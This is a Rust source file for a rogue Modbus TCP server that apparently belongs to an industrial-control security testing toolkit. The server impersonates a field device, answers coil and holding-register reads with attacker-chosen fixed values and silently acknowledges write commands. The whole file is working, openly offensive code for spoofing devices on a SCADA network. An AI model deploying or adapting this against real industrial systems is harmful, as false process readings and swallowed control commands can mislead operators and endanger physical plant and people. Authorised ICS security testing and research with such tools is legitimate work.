/// Rogue Modbus TCP server: impersonates a Modbus slave with configurable fixed responses.
///
/// Implements the impersonation component from SCASS §6.3.1: a fake IED that responds to
/// FC1 (read coils) and FC3 (read holding registers) with attacker-controlled values.
/// Write functions (FC5, FC6, FC16) are silently `ACKed`. All other FCs return exception 01.
use anyhow::{Context, Result};
use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};

/// Start a rogue Modbus TCP server bound to `0.0.0.0:port`.
///
/// `reg_value` is returned for all FC3 holding-register reads.
/// `coil_on`   is returned for all FC1 coil reads.
///
/// Runs until the process is killed (Ctrl-C).
pub fn serve(port: u16, reg_value: u16, coil_on: bool) -> Result<()> {
    let listener = TcpListener::bind(("0.0.0.0", port))
        .with_context(|| format!("Failed to bind Modbus server on port {port}"))?;
    let coil_byte: u8 = u8::from(coil_on);
    println!("[*] Rogue Modbus server on 0.0.0.0:{port}: FC3={reg_value} FC1={coil_byte}");
    println!("[*] Press Ctrl-C to stop.");

    for stream in listener.incoming() {
        match stream {
            Ok(conn) => {
                let peer = conn.peer_addr().map(|a| a.to_string()).unwrap_or_default();
                std::thread::spawn(move || {
                    if let Err(e) = handle_client(conn, reg_value, coil_on) {
                        println!("[!] Client {peer}: {e}");
                    }
                });
            }
            Err(e) => println!("[!] Accept error: {e}"),
        }
    }
    Ok(())
}

fn handle_client(mut stream: TcpStream, reg_value: u16, coil_on: bool) -> Result<()> {
    stream.set_read_timeout(Some(std::time::Duration::from_secs(30)))?;
    stream.set_write_timeout(Some(std::time::Duration::from_secs(5)))?;

    let mut mbap = [0u8; 7];
    loop {
        // Read 7-byte MBAP header: trans_id[2] proto[2] length[2] unit_id[1]
        if stream.read_exact(&mut mbap).is_err() {
            break;
        }
        let trans_id = [mbap[0], mbap[1]];
        let proto_id = [mbap[2], mbap[3]];
        let pdu_len = usize::from(u16::from_be_bytes([mbap[4], mbap[5]]));
        let unit_id = mbap[6];

        if proto_id != [0, 0] || pdu_len < 2 {
            break;
        }

        // Read PDU (length field includes unit_id byte already consumed).
        let mut pdu = vec![0u8; pdu_len - 1];
        if stream.read_exact(&mut pdu).is_err() {
            break;
        }

        let fc = pdu[0];
        let response_pdu = match fc {
            // FC1: Read Coils
            0x01 => {
                let count = parse_count(&pdu);
                let byte_count = count.div_ceil(8);
                let coil_byte_val = if coil_on { 0xFF } else { 0x00 };
                let mut resp = vec![0x01, u8::try_from(byte_count).unwrap_or(u8::MAX)];
                resp.extend(vec![coil_byte_val; byte_count]);
                resp
            }
            // FC3: Read Holding Registers
            0x03 => {
                let count = parse_count(&pdu);
                let byte_count = count * 2;
                let hi = (reg_value >> 8) as u8;
                let lo = (reg_value & 0xFF) as u8;
                let mut resp = vec![0x03, u8::try_from(byte_count).unwrap_or(u8::MAX)];
                for _ in 0..count {
                    resp.push(hi);
                    resp.push(lo);
                }
                resp
            }
            // FC5: Write Single Coil (ACK echo)
            0x05 if pdu.len() >= 5 => vec![0x05, pdu[1], pdu[2], pdu[3], pdu[4]],
            // FC6: Write Single Register (ACK echo)
            0x06 if pdu.len() >= 5 => vec![0x06, pdu[1], pdu[2], pdu[3], pdu[4]],
            // FC16: Write Multiple Registers (ACK with start + count)
            0x10 if pdu.len() >= 5 => vec![0x10, pdu[1], pdu[2], pdu[3], pdu[4]],
            // All other FCs → Modbus exception 01 (illegal function)
            _ => vec![fc | 0x80, 0x01],
        };

        // Build MBAP response header.
        let resp_len = u16::try_from(response_pdu.len() + 1).unwrap_or(u16::MAX);
        let mut frame = Vec::with_capacity(6 + response_pdu.len() + 1);
        frame.extend_from_slice(&trans_id);
        frame.extend_from_slice(&[0x00, 0x00]); // Modbus protocol id
        frame.extend_from_slice(&resp_len.to_be_bytes());
        frame.push(unit_id);
        frame.extend_from_slice(&response_pdu);

        if stream.write_all(&frame).is_err() {
            break;
        }
    }
    Ok(())
}

/// Extract the register/coil count from a Modbus request PDU (bytes 3–4).
fn parse_count(pdu: &[u8]) -> usize {
    if pdu.len() >= 5 {
        usize::from(u16::from_be_bytes([pdu[3], pdu[4]])).min(125)
    } else {
        1
    }
}
